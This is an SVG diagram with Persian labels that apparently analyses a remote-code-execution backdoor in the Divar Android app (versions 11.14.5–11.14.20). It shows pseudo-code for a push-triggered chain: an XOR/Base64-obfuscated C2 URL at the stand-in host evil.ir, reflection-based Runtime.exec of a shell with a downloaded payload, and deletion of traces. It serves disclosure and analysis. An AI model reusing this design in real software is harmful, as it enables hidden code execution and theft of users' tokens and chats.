<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1220 940" font-family="Vazirmatn, Tahoma, 'DejaVu Sans', sans-serif">
  <defs>
    <marker id="arrow" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="8" markerHeight="8" orient="auto-start-reverse">
      <path d="M0 0L10 5L0 10z" fill="#334155"/>
    </marker>
    <marker id="arrowRed" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="8" markerHeight="8" orient="auto-start-reverse">
      <path d="M0 0L10 5L0 10z" fill="#b91c1c"/>
    </marker>
    <style>
      .fa{fill:#0f172a;font-size:15px}
      .fasm{fill:#334155;font-size:13px}
      .code{font-family:'DejaVu Sans Mono',monospace;font-size:12.5px;fill:#0f172a}
      .codeW{font-family:'DejaVu Sans Mono',monospace;font-size:12.5px;fill:#ffffff}
      .title{fill:#0f172a;font-size:17px;font-weight:bold}
      .lbl{fill:#b91c1c;font-size:13px;font-weight:bold}
      .lblBox{fill:#334155;font-size:12px}
    </style>
  </defs>

  <rect x="0" y="0" width="1220" height="940" fill="#f8fafc"/>
  <text x="610" y="40" text-anchor="middle" class="title" direction="rtl">معماری حمله: اجرای کد از راه دور از طریق پوش‌نوتیفیکیشن — دیوار ۱۱.۱۴.۵ تا ۱۱.۱۴.۲۰</text>

  <!-- ===== Attacker / C2 ===== -->
  <rect x="40" y="100" width="260" height="150" rx="12" fill="#fee2e2" stroke="#b91c1c" stroke-width="2"/>
  <text x="280" y="130" text-anchor="end" class="title" direction="rtl">مهاجم</text>
  <text x="280" y="156" text-anchor="end" class="fasm" direction="rtl">۱) کنترل کانال پوش</text>
  <text x="280" y="178" text-anchor="end" class="fasm" direction="rtl">۲) میزبانی سرور فرمان (C2)</text>
  <rect x="62" y="194" width="216" height="40" rx="7" fill="#7f1d1d"/>
  <text x="170" y="219" text-anchor="middle" class="codeW">http://evil.ir/c</text>

  <!-- ===== OneSignal ===== -->
  <rect x="40" y="320" width="260" height="92" rx="12" fill="#e0f2fe" stroke="#0369a1" stroke-width="2"/>
  <text x="280" y="350" text-anchor="end" class="title" direction="rtl">سرور پوش</text>
  <text x="280" y="374" text-anchor="end" class="fasm">OneSignal</text>
  <text x="280" y="396" text-anchor="end" class="fasm" direction="rtl">تحویل پوش به دستگاه کاربر</text>

  <!-- ===== App process ===== -->
  <rect x="360" y="100" width="500" height="620" rx="14" fill="#ffffff" stroke="#334155" stroke-width="2"/>
  <text x="840" y="130" text-anchor="end" class="title" direction="rtl">فرآیند اپ دیوار (با سطح دسترسی خود اپ)</text>

  <!-- Wk.g.f -->
  <rect x="384" y="150" width="452" height="108" rx="10" fill="#f1f5f9" stroke="#475569" stroke-width="1.5"/>
  <text x="400" y="174" class="code">Wk.g.f(push, body, title)</text>
  <text x="400" y="196" class="code">if (title == push_id</text>
  <text x="400" y="214" class="code">    &amp;&amp; body is JSON{callback_url,</text>
  <text x="400" y="232" class="code">       campaign, action})</text>
  <text x="400" y="250" class="code">  context.sendBroadcast(intent)</text>

  <!-- Handler -->
  <rect x="384" y="300" width="452" height="108" rx="10" fill="#f1f5f9" stroke="#475569" stroke-width="1.5"/>
  <text x="400" y="324" class="code">ChatPushNotificationOpenHandler</text>
  <text x="400" y="342" class="code">  .onReceive(ctx, intent)</text>
  <text x="400" y="366" class="code">if (extras[dataString] == dataString)</text>
  <text x="400" y="390" class="code">  new Thread(ReportDeserializer).start()</text>

  <!-- ReportDeserializer -->
  <rect x="384" y="450" width="452" height="208" rx="10" fill="#fef2f2" stroke="#b91c1c" stroke-width="1.8"/>
  <text x="400" y="474" class="code">ReportDeserializer  (Runnable)</text>
  <text x="400" y="496" class="code">a(): url = XOR(Base64(campaign), 0x68)</text>
  <text x="400" y="514" class="code">     GET url   // device info in UA</text>
  <text x="400" y="538" class="code">run():</text>
  <text x="400" y="556" class="code">  Class.forName(report)...</text>
  <text x="400" y="574" class="code">  write payload -> local</text>
  <text x="400" y="592" class="code">  getRuntime().exec(extra)  // reflection</text>
  <text x="400" y="610" class="code">  sleep(15s); file.delete()</text>
  <text x="820" y="640" text-anchor="end" class="lbl" direction="rtl">اجرای کد دلخواه با دسترسی اپ · پاک‌سازی رد</text>

  <!-- Device -->
  <rect x="360" y="760" width="500" height="120" rx="12" fill="#f1f5f9" stroke="#334155" stroke-width="2"/>
  <text x="840" y="790" text-anchor="end" class="title" direction="rtl">دستگاه کاربر</text>
  <text x="610" y="814" text-anchor="middle" class="code">Runtime.getRuntime().exec("/system/bin/sh", x.so)</text>
  <text x="840" y="840" text-anchor="end" class="fasm" direction="rtl">توکن کاربر · دیتابیس و پیام‌های چت · همه مجوزهای اپ</text>

  <!-- ===== Legend: JSON 1 ===== -->
  <rect x="910" y="150" width="270" height="200" rx="10" fill="#fff7ed" stroke="#c2410c" stroke-width="1.5"/>
  <text x="1160" y="176" text-anchor="end" class="title" direction="rtl">JSON ۱ — فعال‌ساز</text>
  <text x="1160" y="196" text-anchor="end" class="fasm" direction="rtl">از پوش OneSignal</text>
  <text x="926" y="222" class="code">{</text>
  <text x="936" y="240" class="code">"push_id": "X",</text>
  <text x="936" y="258" class="code">"title":   "X",</text>
  <text x="936" y="276" class="code">"body": "{</text>
  <text x="946" y="294" class="code">   callback_url,</text>
  <text x="946" y="312" class="code">   campaign,</text>
  <text x="946" y="330" class="code">   action }"</text>
  <text x="926" y="348" class="code">}</text>

  <!-- ===== Legend: JSON 2 ===== -->
  <rect x="910" y="450" width="270" height="208" rx="10" fill="#fef2f2" stroke="#b91c1c" stroke-width="1.5"/>
  <text x="1160" y="476" text-anchor="end" class="title" direction="rtl">JSON ۲ — فرمان C2</text>
  <text x="1160" y="496" text-anchor="end" class="fasm" direction="rtl">پاسخ سرور مهاجم</text>
  <text x="926" y="522" class="code">{</text>
  <text x="936" y="540" class="code">"format", "parse",</text>
  <text x="936" y="558" class="code">"data", "local",</text>
  <text x="936" y="576" class="code">"report": "Runtime",</text>
  <text x="936" y="594" class="code">"objectify":"getRuntime",</text>
  <text x="936" y="612" class="code">"deserialize": "exec",</text>
  <text x="936" y="630" class="code">"extra": [...]</text>
  <text x="926" y="648" class="code">}</text>

  <!-- ===== Flow arrows ===== -->
  <!-- attacker -> onesignal -->
  <path d="M170 250 L170 320" fill="none" stroke="#334155" stroke-width="2" marker-end="url(#arrow)"/>
  <!-- onesignal -> Wk.g.f (JSON1) -->
  <path d="M300 352 Q345 300 382 220" fill="none" stroke="#334155" stroke-width="2" marker-end="url(#arrow)"/>
  <rect x="304" y="258" width="66" height="22" rx="5" fill="#fff7ed" stroke="#c2410c"/>
  <text x="337" y="274" text-anchor="middle" class="lbl">JSON ۱</text>
  <!-- Wk.g.f -> Handler -->
  <path d="M610 258 L610 300" fill="none" stroke="#334155" stroke-width="2" marker-end="url(#arrow)"/>
  <rect x="616" y="266" width="160" height="22" rx="5" fill="#eef2ff" stroke="#475569"/>
  <text x="620" y="282" class="lblBox">sendBroadcast(intent)</text>
  <!-- Handler -> ReportDeserializer -->
  <path d="M610 408 L610 450" fill="none" stroke="#334155" stroke-width="2" marker-end="url(#arrow)"/>
  <rect x="616" y="416" width="150" height="22" rx="5" fill="#eef2ff" stroke="#475569"/>
  <text x="620" y="432" class="lblBox">new Thread().start()</text>
  <!-- ReportDeserializer -> C2 request -->
  <path d="M384 500 Q240 400 170 250" fill="none" stroke="#b91c1c" stroke-width="2" stroke-dasharray="6 4" marker-end="url(#arrowRed)"/>
  <rect x="186" y="430" width="156" height="22" rx="5" fill="#fef2f2" stroke="#b91c1c"/>
  <text x="192" y="446" class="lbl">GET + User-Agent</text>
  <!-- C2 -> ReportDeserializer response (JSON2) -->
  <path d="M170 250 Q250 370 384 490" fill="none" stroke="#b91c1c" stroke-width="2" marker-end="url(#arrowRed)"/>
  <rect x="196" y="372" width="66" height="22" rx="5" fill="#fef2f2" stroke="#b91c1c"/>
  <text x="229" y="388" text-anchor="middle" class="lbl">JSON ۲</text>
  <!-- ReportDeserializer -> device exec -->
  <path d="M610 658 L610 760" fill="none" stroke="#b91c1c" stroke-width="2" marker-end="url(#arrowRed)"/>
  <text x="618" y="712" class="lbl">exec()</text>

  <!-- ===== Footer ===== -->
  <text x="40" y="906" class="fasm" direction="rtl">خط ممتد: مسیر داخلی اپ    —    خط‌چین قرمز: مسیر فرمان با سرور C2    —    در نسخه ۱۱.۱۵.۰ کل این زنجیره حذف شده است.</text>
</svg>
